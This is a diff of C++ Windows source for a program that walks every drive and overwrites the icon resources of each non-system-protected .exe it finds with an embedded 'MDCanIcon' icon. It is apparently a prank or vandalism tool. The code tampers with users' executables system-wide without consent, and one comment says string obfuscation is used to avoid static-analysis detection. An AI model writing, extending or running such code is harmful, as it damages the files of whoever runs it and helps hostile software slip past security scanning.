@@ -16,65 +16,60 @@
 #include <Windows.h>
 #include <Sfc.h>
 #include "resource.h"
+#include "LogicalDrivesEnumerator.h"
 
 #pragma comment(lib, "sfc")
 
-std::vector<std::wstring> GetDriveLetters() 
-{
-    wchar_t diskLetter = 67;  // Start with 'C'
-    wchar_t driveSlash[] = {':', '\\', 0};
-    
-    std::vector<std::wstring> foundDrives;
-    std::wstring concatDrivePath;
-    UINT drivetype = 0;
-
-    for (short i = 1; i != 25; i++) 
-    {
-        concatDrivePath += diskLetter;
-        concatDrivePath += driveSlash; // Effectively "C:\", then next iteration "D:\", etc.
-
-        if (!std::filesystem::exists(concatDrivePath))
-        {
-            concatDrivePath = L"";
-            continue;
-        }
-
-        drivetype = ::GetDriveTypeW(concatDrivePath.c_str());
-        /* 
-            https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew
-            
-            DRIVE_UNKNOWN
-            0	The drive type cannot be determined.
-
-            DRIVE_NO_ROOT_DIR
-            1	The root path is invalid; for example, there is no volume mounted at the specified path.
-
-            DRIVE_REMOVABLE
-            2	The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
-
-            DRIVE_FIXED
-            3	The drive has fixed media; for example, a hard disk drive or flash drive.
-
-            DRIVE_REMOTE
-            4	The drive is a remote (network) drive.
-
-            DRIVE_CDROM
-            5	The drive is a CD-ROM drive.
-
-            DRIVE_RAMDISK
-            6 	The drive is a RAM disk. 
-        */
-            
-        if (drivetype != 5 && drivetype != 0) 
-        {
-            foundDrives.push_back(concatDrivePath);
-        }
-        
-        concatDrivePath = L"";
-        diskLetter++;
-    }
-    return foundDrives;
-}
+//std::vector<std::wstring> GetDriveLetters() 
+//{
+//    wchar_t diskLetter = 67;  // Start with 'C'
+//    wchar_t driveSlash[] = {':', '\\', 0};
+//    
+//    std::vector<std::wstring> foundDrives;
+//    std::wstring concatDrivePath;
+//    UINT drivetype = 0;
+//
+//    for (short i = 1; i != 25; i++) 
+//    {
+//        concatDrivePath += diskLetter;
+//        concatDrivePath += driveSlash; // Effectively "C:\", then next iteration "D:\", etc.
+//
+//        if (!std::filesystem::exists(concatDrivePath))
+//        {
+//            concatDrivePath = L"";
+//            continue;
+//        }
+//
+//        drivetype = ::GetDriveTypeW(concatDrivePath.c_str());
+//        /* 
+//            https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew
+//            
+//            DRIVE_UNKNOWN
+//            0	The drive type cannot be determined.
+//            DRIVE_NO_ROOT_DIR
+//            1	The root path is invalid; for example, there is no volume mounted at the specified path.
+//            DRIVE_REMOVABLE
+//            2	The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
+//            DRIVE_FIXED
+//            3	The drive has fixed media; for example, a hard disk drive or flash drive.
+//            DRIVE_REMOTE
+//            4	The drive is a remote (network) drive.
+//            DRIVE_CDROM
+//            5	The drive is a CD-ROM drive.
+//            DRIVE_RAMDISK
+//            6 	The drive is a RAM disk. 
+//        */
+//            
+//        if (drivetype != 5 && drivetype != 0) 
+//        {
+//            foundDrives.push_back(concatDrivePath);
+//        }
+//        
+//        concatDrivePath = L"";
+//        diskLetter++;
+//    }
+//    return foundDrives;
+//}
 
 std::map<LPCWSTR, WORD> resNames; // Temporarily holds found resource names and locale languages for each iteration.
 
@@ -101,29 +96,33 @@ BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG
     return true;
 }
 
-std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
+void ReplaceEXEIconResources(std::filesystem::path pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
 {
     // Using a char array instead of string in an attempt to deter static analysis string identification.
     wchar_t exeExt[] = {'.', 'e', 'x', 'e', 0};
 
-    for (auto itr_path : std::filesystem::recursive_directory_iterator(pathStart, std::filesystem::directory_options::skip_permission_denied)) 
+    for (auto itr_path : std::filesystem::recursive_directory_iterator(
+        pathStart, 
+        std::filesystem::directory_options::skip_permission_denied | std::filesystem::directory_options::follow_directory_symlink)) 
     {
+        auto current_path = itr_path.path().c_str();
+
         // If current file is not .EXE, skip to next file.
-        if (!(itr_path.path().extension() == exeExt))
+        if (!(itr_path.path().extension().native() == exeExt))
         {
             continue;
         }
 
-        const std::wstring currentPath = itr_path.path().wstring(); // Change from utf-8 to utf-16 'wide'string
+        //const std::wstring currentPath = itr_path.path().wstring(); // Change from utf-8 to utf-16 'wide'string
 
         // Check if current file is a system protected file. If so, skip.
-        if (::SfcIsFileProtected(NULL, currentPath.c_str())) 
+        if (::SfcIsFileProtected(NULL, current_path))
         {
             continue;
         }
 
         // Import EXE as a data image, no execution and locked memory until released.
-        HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
+        HMODULE hmTheExe = ::LoadLibraryExW(current_path, NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
         if (hmTheExe == NULL) 
         {
             resNames.clear();
@@ -138,14 +137,14 @@ std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, L
                 case 1812:  // "The specified image file did not contain a resource section."
                 case 1813:  // "The specified resource type cannot be found in the image file."
                 {
-                    // std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add\n";
-                    if (!::FreeLibrary(hmTheExe)) 
+                    std::wcout << current_path << "\n" << "No icon resources detected, attempting to add\n";
+                    /*if (!::FreeLibrary(hmTheExe)) 
                     {
                         resNames.clear();
                         continue;
-                    }
+                    }*/
                     
-                    HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
+                    HANDLE hUpdateResource = ::BeginUpdateResourceW(current_path, false);
                     if (hUpdateResource == NULL) 
                     {
                         resNames.clear();
@@ -195,7 +194,7 @@ std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, L
             continue;
         }
 
-        HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
+        HANDLE hUpdateResource = ::BeginUpdateResourceW(current_path, false);
         if (hUpdateResource == NULL) 
         {
             resNames.clear();
@@ -219,9 +218,9 @@ std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, L
             continue;
         }
 
+        std::wcout << current_path << "\n" << "Done!\n";
         resNames.clear();
     }
-    return 0;
 }
 
 // void ReplaceSysIcons()
@@ -232,10 +231,10 @@ std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, L
 //    // ...
 //}
 
-int main() {
-    
-    //::FreeConsole(); // Hide console from GUI.
+//WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 
+int wmain()
+{
    // Load the MDCanIcon.ico into memory
     HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
     if (hresMDCanIcon == NULL) 
@@ -261,23 +260,25 @@ int main() {
         return -1;
     }
 
-    std::vector<std::wstring> drives = GetDriveLetters();
+    //std::vector<std::wstring> drives = GetDriveLetters();
+    LogicalDrivesEnumerator logical_drives; // Finds drives on construction
     std::vector<std::thread> threadPool;
+    std::function<void(std::filesystem::path pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)> replaceIcons = ReplaceEXEIconResources;
 
-    for (auto& drive : drives) 
+    for (auto& drive : logical_drives.LogicalDrives)
     {
-        std::filesystem::path drivepath = drive.c_str();
-        threadPool.push_back(std::thread(ReplaceEXEIconResources, drivepath, lpMDcanIcon, dwMDcanIconSize));
+        std::filesystem::path drivepath = drive.DriveName;
+        threadPool.push_back(std::thread(replaceIcons, drivepath, lpMDcanIcon, dwMDcanIconSize));
     }
 
     for (auto& thread : threadPool)
     {
         thread.join();
     }
-
+    
     UnlockResource(lpMDcanIcon);
     ::FreeResource(hgMDcanIcon);
-    std::wcout << std::endl;  // Empty OUT buffer to feel good.
+    //std::wcout << std::endl;  // Empty OUT buffer to feel good.
 
     return 0;
 }
